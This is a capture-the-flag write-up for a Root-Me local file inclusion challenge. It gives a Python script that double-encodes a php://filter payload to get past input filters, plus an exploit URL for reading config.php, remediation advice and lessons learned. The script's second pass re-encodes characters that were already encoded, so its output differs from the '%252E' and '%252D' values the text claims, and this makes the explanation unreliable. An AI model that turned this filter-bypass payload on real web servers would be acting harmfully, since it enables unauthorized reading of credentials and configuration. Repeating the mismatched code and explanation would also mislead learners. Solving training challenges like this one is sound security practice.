## Root-Me.org Challenge Write-Up: Local File Inclusion - Double Encoding
`https://www.root-me.org/en/Challenges/Web-Server/Local-File-Inclusion-Double-encoding?lang=en`

**Challenge Description:** This challenge tasks us with exploiting a Local File Inclusion (LFI) vulnerability to read a sensitive file (likely `config.php`). However, the application employs filters to prevent straightforward attacks.  The key to success lies in understanding and applying a non-standard double-encoding technique. 

**Understanding the Vulnerability:**

The application uses a URL parameter (e.g., `page`) to dynamically include files. This parameter is vulnerable to LFI, allowing attackers to potentially access sensitive files outside the intended webroot. 

**The Challenge of Filters:**

The application's filters block common LFI payloads, including those using the `php://filter` wrapper.  Standard double URL encoding also fails because the filters likely detect patterns like `php`, `filter`, and `base64`.

**Unraveling the Custom Encoding:**

Through careful analysis and experimentation, we've discovered a unique encoding scheme that successfully bypasses the filters. This scheme involves:

1. **Initial URL Encoding:** First, the entire payload is URL encoded using the standard `urllib.parse.quote` function in Python. 

2. **Selective Double Encoding:** Then, specific characters are double URL encoded. The characters that require double encoding are:

   -  `.` (dot): Encoded as `%252E`
   -  `/` (forward slash):  Initially encoded using `urllib.parse.quote_plus` (which encodes spaces as `+` instead of `%20`), resulting in `%2F`, and then the "%" is encoded again.
   -  `-` (hyphen): Encoded as `%252D`
   -  `%` (percent sign):  Initially encoded using `urllib.parse.quote_plus`, resulting in `%25`, and then the "%" is encoded again.

**The Python Script:**

The following Python script performs the custom double encoding:

```python
import urllib.parse
import sys

def custom_encode(payload):
    """
    Applies custom double URL encoding, handling '.', '/', '-', and '%'.
    """

    encoded_payload = ""
    for char in payload:
        if char == '.':
            encoded_char = "%252E" 
        elif char == '-':
            encoded_char = '%252D'
        elif char in '%/':
            encoded_char = urllib.parse.quote_plus(char)    
        else:
            encoded_char = urllib.parse.quote(char)  
        encoded_payload += encoded_char

    # Double-encode all '%' symbols
    double_encoded_payload = ""
    for char in encoded_payload:
        if char == '%':
            double_encoded_payload += urllib.parse.quote(char) 
        else:
            double_encoded_payload += char

    return double_encoded_payload

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 encoder.py <payload>")
        sys.exit(1)

    payload = sys.argv[1]
    encoded_payload = custom_encode(payload)
    print(f"Encoded payload: {encoded_payload}")

if __name__ == "__main__":
    main()
```

**Exploitation Steps:**

1. **Encode the Payload:** Use the Python script to encode the following payload:

   ```
   php://filter/convert.base64-encode/resource=config.php
   ```

2. **Construct the Exploit URL:** Inject the encoded payload into the vulnerable URL parameter:

   ```
   http://challenge01.root-me.org/web-serveur/ch45/index.php?page=[encoded_payload]
   ```

3. **Retrieve and Decode the Response:** The server's response will contain the Base64-encoded content of `config.php`. Decode it to retrieve the sensitive information.

**Why This Encoding Works:**

This unusual encoding scheme likely bypasses the filters because:

- **Pattern Obfuscation:** By selectively double-encoding specific characters, the script breaks up recognizable patterns like "php://" and "base64", which the filters might be looking for.
- **Multiple Decoding Passes:** The server might apply multiple URL decoding passes, allowing the payload to be successfully decoded despite the initial obfuscation.

**Remediation:**

- **Sanitize Input Carefully:** Implement robust input sanitization techniques that go beyond basic URL decoding. Consider using a whitelist approach to restrict allowed characters.
- **Avoid Dynamic File Inclusion:**  Use static includes whenever possible to minimize the risk of LFI.
- **Utilize a Web Application Firewall (WAF):**  A WAF can help detect and block malicious patterns in web requests, including those attempting to exploit LFI.

**Lessons Learned:**

- **Encoding Tricks:** Attackers often use creative encoding techniques to bypass security filters.
- **Defense in Depth:**  Multiple layers of security are crucial to protect against a wide range of attack vectors.
- **Constant Learning:**  The landscape of web security is constantly evolving. Stay updated on the latest threats and mitigation techniques.
